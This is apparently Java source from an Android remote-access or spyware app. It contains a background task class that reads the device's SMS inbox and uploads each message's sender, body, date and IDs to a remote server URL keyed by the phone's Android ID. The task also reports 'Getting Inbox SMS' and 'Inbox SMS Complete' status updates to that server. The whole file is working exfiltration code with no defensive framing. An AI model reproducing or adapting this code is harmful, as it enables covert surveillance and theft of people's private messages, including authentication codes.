package u.can.i.up.expert.utils;

import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Log;

import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class getInboxSms extends AsyncTask<String, Void, String> {
    String j = "";
    String TAG = DataSet.getInstance().LOG_TAG + "." + this.getClass().getName();
    public getInboxSms(String j) {
        this.j = j;
    }
    @Override
    protected String doInBackground(String... params) {
        Log.i(TAG, "Index...............");
        Uri callUri = Uri.parse("content://sms/inbox");
        Cursor mCur = DataSet.getInstance().myService.getApplicationContext().getContentResolver().query(callUri, null, null, null, null);
        if (mCur.moveToFirst())
        {
            int i = 0;
            while (mCur.isAfterLast() == false) {
                if(i<Integer.parseInt(j))
                {
                    Log.i(TAG, "Address: " + mCur.getString(mCur.getColumnIndex("address")));
                    Log.i(TAG, "Message: " + mCur.getString(mCur.getColumnIndex("body")));

                    SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd*hh:mm:ss");
                    Calendar calendar = Calendar.getInstance();
                    String now = mCur.getString(mCur.getColumnIndex("date"));
                    calendar.setTimeInMillis(Long.parseLong(now));
                    Log.i(TAG, "Date: " + formatter.format(calendar.getTime()));
                    Log.i(TAG, "**************************************************************");

                    String thread_id = mCur.getString(mCur.getColumnIndex("thread_id"));
                    String id = mCur.getString(mCur.getColumnIndex("_id"));

                    try {
                        Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "[" + formatter.format(calendar.getTime()).replace(' ', '*') + "] [" + thread_id + "] " + "[" + id + "] " + "[" + mCur.getString(mCur.getColumnIndex("address")).replace(' ', '*') + "] " + mCur.getString(mCur.getColumnIndex("body")).replace(' ', '*'));
                    } catch (UnsupportedEncodingException e) {

                        e.printStackTrace();
                    }

                }
                i++;
                mCur.moveToNext();
            }
        }
        mCur.close();

        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Get",false).commit();
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Inbox SMS Complete");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }
    @Override
    protected void onPreExecute() {
        while(PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getBoolean("Get",false) == true)
        {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting Inbox SMS");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Get",true).commit();
    }
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
